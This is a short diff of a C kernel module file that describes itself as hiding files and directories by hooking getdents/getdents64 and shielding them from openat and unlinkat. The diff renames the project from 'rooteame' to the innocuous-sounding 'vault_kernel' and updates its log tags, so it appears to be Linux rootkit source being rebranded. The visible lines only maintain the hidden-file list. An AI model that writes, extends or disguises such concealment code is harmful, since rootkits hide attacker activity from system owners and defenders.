@@ -1,4 +1,4 @@
-/* rooteame - file_hide.c
+/* vault_kernel - file_hide.c
  * File and directory hiding via getdents/getdents64 hook
  * Also protects hidden files from openat
  * ruby570bocadito © 2026
@@ -16,7 +16,7 @@ void file_hide_add(const char *name) {
         strncpy(hidden_files[hidden_file_count], name, 255);
         hidden_files[hidden_file_count][255] = '\0';
         hidden_file_count++;
-        pr_info(ROOTEAME_TAG " hiding file/dir: %s\n", name);
+        pr_info(VAULT_KERNEL_TAG " hiding file/dir: %s\n", name);
     }
     spin_unlock_irqrestore(&file_hide_lock, flags);
 }
@@ -30,7 +30,7 @@ void file_hide_del(const char *name) {
             memmove(hidden_files[i], hidden_files[i+1],
                     (hidden_file_count - i - 1) * 256);
             hidden_file_count--;
-            pr_info(ROOTEAME_TAG " unhid file/dir: %s\n", name);
+            pr_info(VAULT_KERNEL_TAG " unhid file/dir: %s\n", name);
             break;
         }
     }
@@ -248,11 +248,11 @@ asmlinkage long hooked_unlinkat(int dirfd, const char __user *pathname,
 }
 
 int file_hide_init(void) {
-    pr_info(ROOTEAME_TAG " file hiding initialized (max=%d)\n", MAX_HIDDEN_FILES);
+    pr_info(VAULT_KERNEL_TAG " file hiding initialized (max=%d)\n", MAX_HIDDEN_FILES);
     return 0;
 }
 
 void file_hide_cleanup(void) {
     hidden_file_count = 0;
-    pr_info(ROOTEAME_TAG " file hiding cleaned\n");
+    pr_info(VAULT_KERNEL_TAG " file hiding cleaned\n");
 }
